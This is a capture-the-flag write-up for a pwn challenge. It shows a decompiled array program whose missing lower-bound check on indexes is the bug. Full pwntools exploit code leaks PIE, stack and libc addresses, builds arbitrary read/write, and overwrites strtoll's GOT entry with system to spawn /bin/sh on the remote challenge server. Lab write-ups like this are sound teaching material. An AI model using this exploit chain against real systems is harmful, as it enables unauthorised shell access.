The catch is this challenge is that we not given the libc. its part of the challenge to find the correct libc.
As always, lets pop the binary into IDA:

```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  __int64 v3; // r15
  __int64 index; // rax
  __int64 v6[100]; // [rsp+0h] [rbp-3C8h]
  char input[104]; // [rsp+320h] [rbp-A8h] BYREF
  unsigned __int64 canary; // [rsp+388h] [rbp-40h]

  canary = __readfsqword(0x28u);
  setbuf(_bss_start, 0LL);
  setbuf(stdin, 0LL);
  setbuf(stderr, 0LL);
  puts("Your array has 100 entries");
  while ( 1 )
  {
    while ( 1 )
    {
      printf("Read/Write?: ");
      fgets(input, 100, stdin);
      if ( input[0] != 'R' )
        break;
      printf("Index: ");
      fgets(input, 100, stdin);
      index = strtoll(input, 0LL, 10);
      if ( index > 99 )
LABEL_6:
        puts("Invalid index");
      else
        printf("Value: %lld\n", v6[index]);
    }
    if ( input[0] != 'W' )
      break;
    printf("Index: ");
    fgets(input, 100, stdin);
    v3 = strtoll(input, 0LL, 10);
    if ( v3 > 99 )
      goto LABEL_6;
    printf("Value: ");
    fgets(input, 100, stdin);
    v6[v3] = strtoll(input, 0LL, 10);
  }
  puts("Invalid option");
  return 0;
}
```

This binary basiclly consists of two basic things.
You can read from the array, or write to the array.
The following python code interacts with the binary:

```py
elf = ELF("array")

p = remote('34.124.157.94' , 10546)
def read_buf(idx):
        p.recvuntil("?: ")
        p.sendline("R")
        p.recvuntil("Index: ")
        p.sendline(str(idx))
        p.recvuntil("Value: ")
        res = p.recvline()[:-1]
        return int(res)

def write_buf(idx, val):
        p.recvuntil("?: ")
        p.sendline("W")
        p.recvuntil("Index: ")
        p.sendline(str(idx))
        p.recvuntil("Value: ")
        p.sendline(str(val))

```

The bug here is that the binary doesn't check for the lower bound, so we can read/write to any place we want.
After we run checksec on the binary, we can see that its really mitagated:
```
   Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
    RUNPATH:  '.'
```
it contains a stack-canary (which is a random value stored right before the RBP in the stack to protect from buffer overflows)
NX is enabled (which marks the bss/stack/heap pages as non-executable)
PIE is enabled (which means that the binary is loaded to a random memory)
And lastly its Partial-Relro, which means it will resolve libc function in run time(+ its not full-relro so we can do got-overwrites)

our plan for exploting this binary will be as follows:
We want to gain a write-what-where primitive from our write-what-buffer :) functionliity.
In order to do that, we need binary address leak, stack leak, and libc leak.
We can see the the buffer isn't zeroed. this means that we can read and leak previously used data in the stack.
I leaked the binary address from 1 address before the buffer (so I entered -1 to the readbuf functionlity)
and I leaked a stack address from -7.
After leaking this stack offset, I saw that our buffer address is 0x320 bytes before that address.
So we basiclly know the address of the buffer!
Why is it important you ask?
Well, since we can read/write `buffer_address - i`, once we know buffer_address, after choosing `i = buffer_address + addr`, we can read any location we want!
(aslong as its before the buffer, but the stack is one of the last pages in the elf so thats fine)
This way I gained my arbitrary read/write primitive:

```py
def arb_read(addr):
        return read_buf((addr - buffer_addr) // 8) #since read_buf will read from buffer_addr + 8*input, if input = (addr - buffer)/8_addr it will read from addr.

def arb_write(addr, what):
        return write_buf((addr - buffer_addr) // 8, what) 

elf.address = read_buf(-1) - 0x11f5
stack = read_buf(-7)
buffer_addr = stack - 0x320
```
Now we need to find the libc version.
In order to find it, we can use a tool like `https://libc.blukat.me/`.
You basiclly give it a few libc functions you leaked, and it will find the correct libc.
I wrote this script to extract the libc, and then put it in the website:
```py
libc_leaks = ['puts', '__libc_start_main']
for func in libc_leaks:
       print(func, '-' + hex(arb_read(elf.got[func])))
```
![image](https://github.com/Itay212121/Weekly-CTF/assets/56035342/3f89b4f5-ea94-4a85-9c28-5a889c9657a5)

we found the libc.
Now we just read the one of the got function and substract their offset:
`libc.address = arb_read(elf.got['puts']) - libc.sym.puts`

now we can just do a got-overwrite with our arbitrary write, and replace strtoll with system. (strtoll will be called with our input in RDI, which is the parameter for system)

```py
arb_write(elf.got['strtoll'], libc.sym.system) #got overwrite
p.recvuntil("?: ")
p.sendline("R")
p.recvuntil("Index: ")
p.sendline('/bin/sh\x00')

p.interactive()
```
